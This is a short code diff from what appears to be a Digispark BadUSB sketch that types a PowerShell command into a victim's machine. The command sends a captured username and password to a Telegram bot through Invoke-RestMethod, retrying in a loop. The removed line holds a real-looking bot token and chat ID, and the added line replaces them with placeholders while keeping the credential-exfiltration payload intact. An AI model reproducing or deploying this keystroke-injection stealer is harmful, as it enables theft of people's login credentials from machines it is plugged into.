@@ -22,7 +22,7 @@ void loop() {
   DigiKeyboard.delay(300);
   
   // Envío a Telegram y cierre
-  DigiKeyboard.println(F("$token='8506030866:AAGk2-OzSwFs2hFWr783LhfcVu6yIlnsVnU';$chat='1174049668';$msg='U:'+$user+' P:'+$pass;try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$token+'/sendMessage') -Method Post -Body @{chat_id=$chat;text=$msg};exit}catch{}}}while($true)"));
+  DigiKeyboard.println(F("$token='SIN_TOKEN';$chat='SIN_ID';$msg='U:'+$user+' P:'+$pass;try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$token+'/sendMessage') -Method Post -Body @{chat_id=$chat;text=$msg};exit}catch{}}}while($true)"));
   DigiKeyboard.delay(300);
   
   DigiKeyboard.println();
